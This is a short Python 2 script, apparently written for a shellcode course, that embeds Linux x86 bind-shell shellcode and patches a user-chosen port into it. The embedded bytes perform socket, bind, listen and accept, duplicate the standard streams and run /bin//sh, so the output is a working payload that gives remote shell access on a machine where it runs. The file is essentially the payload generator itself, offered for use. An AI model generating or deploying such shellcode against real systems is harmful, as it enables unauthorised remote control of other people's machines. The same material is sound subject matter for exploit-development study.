#!/usr/bin/python

# Filename: shell_bind_tcp_wrapper.py
# Author: h3ll0clar1c3
# Purpose: Wrapper script to generate dynamic shellcode, configurable bind port number
# Usage: python shell_bind_tcp_wrapper.py <port>

import socket
import sys

shellcode = """
\\x31\\xc0\\x31\\xdb\\x31\\xf6\\x56\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x56\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x16\\x51\\x52\\xb0\\x66\\xb3\\x02\\x89\\xe1\\xcd\\x80\\x6a\\x01\\x52\\xb0\\x66\\xb3\\x04\\x89\\xe1\\xcd\\x80\\x56\\x56\\x52\\xb0\\x66\\xb3\\x05\\x89\\xe1\\xcd\\x80\\x89\\xc2\\x31\\xc9\\xb1\\x03\\x89\\xd3\\x49\\xb0\\x3f\\xcd\\x80\\x79\\xf9\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xc2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
"""

if (len(sys.argv) < 2):
    print "Usage: python {name} <port>".format(name = sys.argv[0])
    exit()

port = int(sys.argv[1])

if port < 0 or port > 65535:
    print "Invalid port number, must be between 0 and 65535!"
    exit()

port = hex(socket.htons(int(sys.argv[1])))
shellcode = shellcode.replace("\\x11\\x5c", "\\x{b1}\\x{b2}".format(b1 = port[4:6], b2 = port[2:4]))

print("Generated shellcode using custom port: " + sys.argv[1])
print shellcode

print "Shellcode length: %d bytes" % len(shellcode)
if "\x00" in shellcode:
    print "WARNING: Null byte is present!"
else:
    print "No nulls detected"

